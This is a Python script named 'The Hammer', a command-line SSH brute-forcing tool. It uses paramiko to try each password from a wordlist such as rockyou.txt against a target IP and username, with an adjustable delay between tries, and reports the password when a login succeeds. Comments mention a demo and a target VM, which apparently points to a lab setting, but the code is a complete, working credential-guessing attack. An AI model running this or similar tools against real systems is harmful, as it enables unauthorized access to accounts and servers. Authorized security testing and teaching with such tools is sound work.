import paramiko
import time
import argparse
import sys

def attempt_ssh_login(target_ip, username, password):
    #Attempts SSH connection with paramiko
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Timeout is set to 3 seconds for demo
        client.connect(hostname=target_ip, username=username, password=password, timeout=3)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        # print(f"[!] Connection Error: {e}")
        return None
    finally:
        client.close()

def start_hammer(ip, user, wordlist_path, delay):
    #Goes through rockyou.txt
    print(f"[*] Starting attack on {ip} as {user}...")
    
    try:
        with open(wordlist_path, 'r') as f:
            for line in f:
                password = line.strip()
                print(f"[~] Testing: {password}")
                
                result = attempt_ssh_login(ip, user, password)
                
                if result is True:
                    print(f"\n[+] SUCCESS! Password found: {password}")
                    return # Stop on entry
                
                # Adjustable delay
                time.sleep(delay) 
                
    except FileNotFoundError:
        print(f"[!] Error: Wordlist '{wordlist_path}' not found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="The Hammer: A command-line SSH brute-forcing tool.")
    
    # Required arguments
    parser.add_argument("ip", help="The IP address of the Target VM.")
    parser.add_argument("user", help="The username to attempt to login as.")
    
    # Optional arguments with default values
    parser.add_argument("-w", "--wordlist", default="rockyou.txt", help="Path to the password list (default: rockyou.txt)")
    parser.add_argument("-t", "--timing", type=float, default=1.5, help="Delay between attempts in seconds (default: 1.5)")

    args = parser.parse_args()
    start_hammer(args.ip, args.user, args.wordlist, args.timing)